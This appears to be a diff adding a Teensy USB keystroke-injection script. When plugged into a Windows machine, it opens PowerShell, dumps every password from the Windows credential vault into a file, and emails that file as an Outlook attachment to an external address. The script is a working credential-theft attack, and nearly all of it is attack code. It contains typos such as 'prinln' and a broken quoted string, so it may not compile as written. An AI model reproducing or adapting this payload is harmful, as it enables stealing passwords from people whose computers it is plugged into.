@@ -1,0 +1,55 @@
+/*
+	Author:         Davey Addison [ Secsi/@Supersafesecs ]
+	Github:         github.com/Secsi
+	Webby:          simpleinfosec.com
+  
+	Teensy Password Exfil Through Outlook 
+	
+	Script dumps passwords from Windows security credential store into a file and exfils the information on an Outlook attachment
+	Issues: Email remains in sent items folder!!!
+	
+*/
+#if defined(CORE_TEENSY)
+#define LED_PIN 6
+#endif
+
+void setup(){
+	delay(1500);
+	posh();
+	Keyboard.prinln("$path=$env:APPDATA+"\file.txt"");
+	Keyboard.prinln("[void]");
+	Keyboard.prinln("[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]");
+	Keyboard.prinln("$vault = New-Object Windows.Security.Credentials.PasswordVault");
+	Keyboard.prinln("$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } > $path");
+	Keyboard.prinln("Add-Type -Assembly 'Microsoft.Office.Interop.Outlook' -PassThru");
+	Keyboard.prinln("$Outlook = New-Object -ComObject Outlook.Application");
+	Keyboard.prinln("$Mail = $Outlook.CreateItem(0)");
+	Keyboard.prinln("$Mail.Recipients.Add('david.addison@abzena.com')");
+	Keyboard.prinln("$Mail.Subject='Data Extracted'");
+	Keyboard.prinln("$Mail.Body = 'test email'");
+	Keyboard.prinln("$Mail.Attachments.Add($path)");
+	Keyboard.prinln("$Mail.Send()");
+	Keyboard.println("exit")
+}
+
+void loop(){
+	// blink quickly when complete
+	digitalWrite(LED_PIN, HIGH);
+	delay(200);
+	digitalWrite(LED_PIN, LOW);
+	delay(200);
+}
+
+void posh(){
+  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
+  Keyboard.send_now();
+  delay(1000);
+  Keyboard.set_modifier(0);
+  Keyboard.send_now();
+  delay(1500);
+  Keyboard.print("powershell");
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(2000);
+}
